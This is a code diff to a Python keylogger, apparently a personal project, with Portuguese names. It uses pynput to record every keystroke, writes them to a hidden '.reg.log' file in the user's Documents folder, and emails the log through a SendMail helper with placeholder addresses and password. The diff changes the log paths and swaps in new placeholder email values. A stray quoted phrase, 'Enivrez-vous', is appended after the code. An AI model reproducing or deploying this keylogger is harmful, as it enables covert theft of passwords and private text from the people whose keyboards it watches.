@@ -1,3 +1,4 @@
+import getpass
 from os import listdir
 from pynput import keyboard
 from email.mime.text import MIMEText
@@ -70,23 +71,24 @@ class CaptureTheKey:
 
     @classmethod
     def formata_saida(clt):
-        with open('/home/.reg.log', 'w') as f:
+        with open(f'/home/{getpass.getuser()}/Documents/.reg.log', 'w') as f:
             [f.writelines(coisas) for coisas in CaptureTheKey.digitado]
 
 
 if __name__ == '__main__':
     texto = ""
     # email
-    if '.reg.log' in listdir('/home/'):
-        with open('/home/reg.log', 'r') as f:
+    if '.reg.log' in listdir(f'/home/{getpass.getuser()}/Documents/'):
+        with open(f'/home/{getpass.getuser()}/Documents/.reg.log', 'r') as f:
             tamanho = f.read()
         if len(tamanho) > 0:
             for palavras in tamanho:
                 texto += palavras
-            instancia = SendMail('seuemail@outlook.com', 'emaildestino@outlook.com', 'senhaDoSeuEmail', texto)
+            instancia = SendMail('email@email.com', 'email@email.com', 'senha', texto)
             th = Thread(instancia.sendEmail(), args=())
             th.start()
             th.join()
     # continua...
     with keyboard.Listener(on_press=CaptureTheKey.press) as listener:
         listener.join()
+"Enivrez-vous"
